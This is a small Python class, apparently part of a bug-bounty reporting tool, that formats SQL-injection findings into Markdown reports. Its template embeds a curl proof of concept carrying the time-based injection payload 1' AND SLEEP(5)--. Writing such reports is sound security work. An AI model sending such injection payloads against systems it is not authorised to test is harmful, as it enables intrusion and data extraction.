class ProofBuilder:
    def build(self, target, finding):
        return f"""# 🛑 {finding['impact']}

## 🎯 Target (In Scope)
{target}

## 📍 Endpoint
{finding['url']}

## 🔑 Parameter
{finding['param']}

## 🧪 Evidence
Response delayed by **{finding['evidence']['delay']} seconds**

## 🔥 Proof of Concept
```bash
curl "{finding['url']}?{finding['param']}=1'%20AND%20SLEEP(5)--"
⚠️ Impact
This vulnerability allows time-based inference and may lead to full data extraction. """
def build_bulk(self, target, findings):
    report = ""
    for f in findings:
        report += self.build(target, f)
        report += "\n---\n\n"
    return report
